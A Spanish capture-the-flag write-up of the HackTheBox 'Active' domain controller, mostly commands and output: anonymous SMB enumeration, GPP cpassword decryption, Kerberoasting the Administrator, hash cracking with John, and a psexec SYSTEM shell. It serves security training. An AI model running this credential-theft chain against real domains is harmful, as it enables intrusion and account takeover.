---
title: Active - HackTheBox
categories: [ Windows ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Active/Active.jpg">

Hola! Hoy completaremos la máquina [Active](https://app.hackthebox.com/machines/Active) de la plataforma [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos:

- **SMB Enumeration**
- **Abusing GPP Passwords**
- **Decrypting GPP Passwords - gpp-decrypt**
- **Kerberoasting Attack (GetUserSPN.py) [Privilege Escalation]**

# Enumeración

* * * *

## Escaneo de puertos 

Como en todas las máquinas, usaremos la herramienta `nmap` para efectuar el escaneo de puertos.

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG allPorts
Nmap scan report for 10.10.10.100
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49165/tcp open  unknown          syn-ack ttl 127
49166/tcp open  unknown          syn-ack ttl 127
49168/tcp open  unknown          syn-ack ttl 127
```

Ahora que tenemos los puertos abiertos, realizaremos un escaneo mucho más exhaustivo sobre estos puertos.

```sh
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49168 -sCV 10.10.10.100 -oN targeted
Nmap scan report for 10.10.10.100

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-19 17:15:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msdfsr?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49165/tcp open  unknown
49166/tcp open  unknown
49168/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-19T17:15:50
|_  start_date: 2023-07-19T14:35:39
```

## Enumeración SMB - TCP 445

Utilizaremos la herramienta `crackmapexec` para enumerar el servicio SMB, conseguimos un dominio.

```sh
❯ crackmapexec smb 10.10.10.100
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

Ahora enumeraremos los recursos compartidos a nivel de red con la herramienta `smbclient`, nos fijamos en el recurso compartido `Replication`

```sh
❯ smbclient -L active.htb -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
```

Ya que `Replication` es el único recurso al que nos podemos conectar, descargaremos todos sus archivos recursivamente, conseguimos un archivo `Groups.xml`

```sh
❯ smbget -R smb://10.10.10.100/Replication -U ""
Password for [] connecting to //10.10.10.100/Replication: 
Using workgroup WORKGROUP, guest user
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                                                                       
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI                                                                          
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf                                              
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml                                                         
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                                                                          
smb://10.10.10.100/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                                                                       
smb://10.10.10.100/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf                                              
Downloaded 8,11kB in 7 seconds
```

El archivo tiene una contraseña encriptada por lo que parece ser GPP

```sh
❯ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

# Explotación

Usaremos la herramienta [GPPRefDecrypt.py](https://raw.githubusercontent.com/reider-roque/pentest-tools/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py) para decodear esta contraseña

```sh
❯ python3 gpprefdecrypt.py "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Ahora que tenemos una contraseña, vamos a valídarlas con `crackmapexec`

```sh
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```

Realmente por el servicio **WinRM** no podemos conectarnos, asi que usaremos estas credenciales para conectarnos por SMB al recurso `Users`

```sh
❯ smbclient //10.10.10.100/Users -U 'SVC_TGS'
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> dier
dier: command not found
smb: \> dir
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018

		5217023 blocks of size 4096. 279051 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget * 
```

Si nos dirigimos al directorio SVC_TGS, conseguimos la user flag

# Escalada de privilegios

Ahora que tenemos credenciales, podemos intentar un ataque **Kerberoasting** con la herramienta `Get-UsersSPN.py` para conseguir un TGS válido con el parámetro `-request`, vemos que el usuario Administrator es vulnerable.

```sh
❯ GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-07-19 16:36:45.268951             



❯ GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-07-19 16:36:45.268951             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b645e10c89f15a53763120ddfe781601$510df34d4de41c84beeb85e9e5ccf5f19052b166b06db8f541c2b86ffb9811822c6b4d4f760820cb8d0ccc1d568c8e8cd01b10022c88f802141fb27e1cb61e5765440bc5b79d782c689a098c821ed706110c4e0e8dd19e15b49b0b610fad2c2ea27a53d536ef801f12de3bddcbe1bdc076cbae4b58dad9a8be8efcfab10363c14b3f19cc8f2111577dd8f2644defaa52365109260466e23e10ab9ec0d57b8f45aa49ad61eb9a4618f26f696f566334f5a99385776b4509905ddc8dde98aab9e9a1734f50fd038793ab5824b0b888a50c55e09f3a5a3eabeeac1f745f6f4eca391e73bd32e0b91ba55541d2080484b1afa7d02cb082d1dceb12359858a6230e25503cb29ffeb8d6d08755e174518f4ae8d3cee4b3f1af2e4ed5aec148dabcd0a784464f3ea8d84bc82d421a1fe8ef8e506a04d42f2d7ef42c16de797e02726d50650c1de73aa145267382758b5f40ee61aa669f6b60b6e98f03aeed6b27de573d836050813f1b72442b7cd64c58867722e75994157273a9d1897975e6d2bd2f7c4c7eca7d57f1d0207e567915baafa7b042e18967a14e68e20cb566dbc1b5aefbbea16063d098492fb835329d562696cf3532d44779c461abc6f0b463694417c6a3e91aed0fe4f009de6dcc64d17554d08c46f47fb160ac4cb81242a3d9dd28cdec12f1d046b23a2c0f8c6c6c329cc65eb405a8c4bf7fff06df50028663021e114004cf8a7cf983ab0e80d4b8f017b7015e24c66f492237a6bd78dcbd02d96d140087556e7403b4703da278c101c4f55d1eebd7d5bc18fef7db071d83e40f3bcfc9a85b1ab642e0c45684c156d4928918644e5392ea580dcc06ff41d653b08b86ac7c46762194349049f5be7728470e3e753e262fc4495d0553db86a69af567fdc4531230ab3637a57ad36d62f0a620597065c0b197d83a70526f9900b77c9cc6f44bc2ba89e820aea86e780a3da50080c2985148d0b78ccc68fa980abf38a91f67810ca1528df07f74416a078696e6e86ac65088164a11556ba751657286fcfe5df7a2426ea633676051ce69bbf23d472ed1e34365c78907c007be4befc29506031d495d0e9a9f7969a2f7a6434b1d154f91f0745e29a0c512e8e0bb4dfc8e58235c399c8f0fa26d4f645181520d08359cf9945c6f794ef590c01ae5a68e1e50a452636bd8a521f229f4df61d66f18f11bb9f58eb7b50cbe92dfcc2997388253f92d93a953e31d78c2466d1d8ed8377cfbeca982018decd0db46
```

Ahora que hemos conseguido el hash del usuario Administrator, lo crackearemos usando la herramienta `John`

```sh
❯ john -w:/opt/wef/main/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:09 DONE (2023-07-19 19:32) 0.1094g/s 1153Kp/s 1153Kc/s 1153KC/s Tiffani143..ThannxTo Him
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ahora que tenemos contraseña, la validaremos con `crackmapexec`

```sh
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

Y ahora que las credenciales son válidas y nos marca un **(Pwn3d!)**, utilizaremos la herramienta `psexec.py` para conseguir una shell en la máquina

```cmd
❯ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file UWmWAXyK.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service htXo on 10.10.10.100.....
[*] Starting service htXo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```